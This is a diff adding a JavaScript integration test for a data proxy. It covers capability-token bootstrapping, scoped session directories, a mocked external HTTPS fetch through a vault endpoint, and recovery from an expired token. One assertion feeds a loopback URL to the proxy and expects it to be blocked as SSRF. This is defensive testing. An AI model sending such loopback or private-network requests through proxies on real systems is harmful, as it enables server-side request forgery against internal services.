+     res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' })
+     res.end('Not found')
+     return
+    }
+    const val = memStore.get(fullKey)
+    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
+    res.end(method === 'HEAD' ? '' : val)
+    return
+   }
+   if (method === 'POST') {
+    const ct = String(req.headers['content-type'] || '').toLowerCase()
+    if (!ct.startsWith('text/plain')) {
+     res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' })
+     res.end('Internal Server Error: The "data" argument must be of type string or an instance of Buffer, TypedArray, or DataView. Received an instance of Object')
+     return
+    }
+    const rawBody = Buffer.concat(chunks).toString('utf8')
+    memStore.set(fullKey, rawBody)
+    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
+    res.end('ok')
+    return
+   }
+   if (method === 'DELETE') {
+    memStore.delete(fullKey)
+    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' })
+    res.end('ok')
+    return
+   }
+   res.writeHead(405)
+   res.end('Method not allowed')
+  })
+ })
+
+ await new Promise(resolve => memServer.listen(0, '127.0.0.1', resolve))
+ const memPort = memServer.address().port
+ const secretStore = createServerSecretStore({ useEnv: false })
+ const externalCalls = []
+ const proxy = createDataProxyHandler({
+  backendBaseUrl: `http://127.0.0.1:${memPort}/?mode=disk`,
+  secretStore,
+  setAsDefaultStore: false,
+  externalFetch: async (url, init) => {
+   externalCalls.push({ url, init })
+   if (url === 'https://data.nateferrero.com/beacon/balance') {
+    return {
+     ok: true,
+     status: 200,
+     statusText: 'OK',
+     url,
+     headers: new Headers({ 'content-type': 'text/plain' }),
+     async text() { return '111249' },
+    }
+   }
+   throw new Error(`Unexpected externalFetch URL: ${url}`)
+  },
+ })
+
+ const dataStatuses = []
+ const proxyServer = http.createServer((req, res) => {
+  const pathname = (req.url || '/').split('?')[0]
+  if (pathname === '/api/data' || pathname.startsWith('/api/data/')) {
+   const origWriteHead = res.writeHead.bind(res)
+   res.writeHead = (statusCode, ...rest) => {
+    dataStatuses.push({ method: req.method, statusCode, url: req.url })
+    return origWriteHead(statusCode, ...rest)
+   }
+   return proxy.handleDataProxyRequest(req, res)
+  }
+  if (pathname === '/api/vault' || pathname.startsWith('/api/vault/')) {
+   return proxy.handleVaultApiRequest(req, res)
+  }
+  res.writeHead(404)
+  res.end('Not found')
+ })
+
+ await new Promise(resolve => proxyServer.listen(0, '127.0.0.1', resolve))
+ const proxyPort = proxyServer.address().port
+ const proxyOrigin = `http://127.0.0.1:${proxyPort}`
+ const proxyDataUrl = `${proxyOrigin}/api/data?mode=disk`
+
+ const makeMemStorage = () => {
+  const m = new Map()
+  return {
+   getItem: k => (m.has(k) ? m.get(k) : null),
+   setItem: (k, v) => { m.set(k, String(v)) },
+   removeItem: k => { m.delete(k) },
+  }
+ }
+
+ try {
+  const client = httpKV({ baseUrl: proxyDataUrl, switchable: true, proxyCapabilities: true, proactiveToken: true })
+
+  // 1. Initial read proactively bootstraps capability token: ZERO 401s on /api/data
+  assert.equal(await client.get('session'), null)
+  assert.equal(dataStatuses.some(s => s.statusCode === 401), false)
+
+  // 2. Full session initialization, confirming a scoped directory, & writes (including empty strings) trigger ZERO 500s or 401s
+  const winMem = {
+   localStorage: makeMemStorage(),
+   sessionStorage: makeMemStorage(),
+  }
+  const sessState = await initSessionState(client, winMem)
+  assert.ok(sessState.sessionId)
+  const dirSetRes = await setSessionDataDir(client, winMem, sessState.sessionId, { dataDir: '/tmp/test-civil-dir' })
+  assert.equal(dirSetRes.ok, true)
+  const dirClient = client.withBasePath('/tmp/test-civil-dir')
+  await dirClient.set('lanes#lane-1/package', DEFAULT_PACKAGE_ID)
+  await dirClient.set('stories#lane-1/r/2026-11-27/st-1', JSON.stringify({ id: 'st-1', ok: true }))
+  await dirClient.set('empty-val', '')
+  assert.equal(await dirClient.get('lanes#lane-1/package'), DEFAULT_PACKAGE_ID)
+  assert.equal(await dirClient.get('empty-val'), '')
+  await dirClient.delete('empty-val')
+  assert.equal(dataStatuses.some(s => s.statusCode === 401), false, `Unexpected 401s: ${JSON.stringify(dataStatuses)}`)
+  assert.equal(dataStatuses.some(s => s.statusCode >= 500), false, `Unexpected 500s: ${JSON.stringify(dataStatuses)}`)
+
+  // 3. externalFetch proxies external HTTPS requests through /api/vault/fetch (avoiding browser CORS)
+  const extResp = await client.externalFetch('https://data.nateferrero.com/beacon/balance')
+  assert.equal(extResp.ok, true)
+  assert.equal(extResp.status, 200)
+  assert.equal(await extResp.text(), '111249')
+  assert.equal(externalCalls.length, 1)
+  assert.equal(externalCalls[0].url, 'https://data.nateferrero.com/beacon/balance')
+  assert.equal(externalCalls[0].init.credentials, 'omit')
+
+  // Unauthenticated /api/vault/fetch -> 401 with bootstrap hint; loopback/private SSRF -> 400/403
+  const unauthFetch = await fetch(`${proxyOrigin}/api/vault/fetch`, {
+   method: 'POST',
+   headers: { 'Content-Type': 'application/json' },
+   body: JSON.stringify({ url: 'https://data.nateferrero.com/beacon/balance' }),
+  })
+  assert.equal(unauthFetch.status, 401)
+  assert.equal(unauthFetch.headers.get(TOKEN_BOOTSTRAP_HEADER), '/api/vault/session')
+
+  await assert.rejects(() => client.externalFetch('http://127.0.0.1:3333/'), /loopback|private|blocked|not allowed/i)
+
+  // 4. Expired session token recovers cleanly by re-bootstrapping via /api/vault/session
+  const expiredTok = createCapabilityToken({
+   sessionId: sessState.sessionId,
+   basePath: '/tmp/test-civil-dir',
+   packages: [DEFAULT_PACKAGE_ID],
+   iat: Date.now() - 10_000,
+   exp: Date.now() - 1,
+  }, secretStore)
+  dirClient.setSessionToken(expiredTok, { sessionId: sessState.sessionId, basePath: '/tmp/test-civil-dir' })
+  assert.equal(await dirClient.get('lanes#lane-1/package'), DEFAULT_PACKAGE_ID)
+ }
+ finally {
+  if (typeof proxyServer.closeAllConnections === 'function') proxyServer.closeAllConnections()
+  if (typeof memServer.closeAllConnections === 'function') memServer.closeAllConnections()
+  await Promise.all([
+   new Promise(resolve => proxyServer.close(resolve)),
+   new Promise(resolve => memServer.close(resolve)),
+  ])
  }
 })
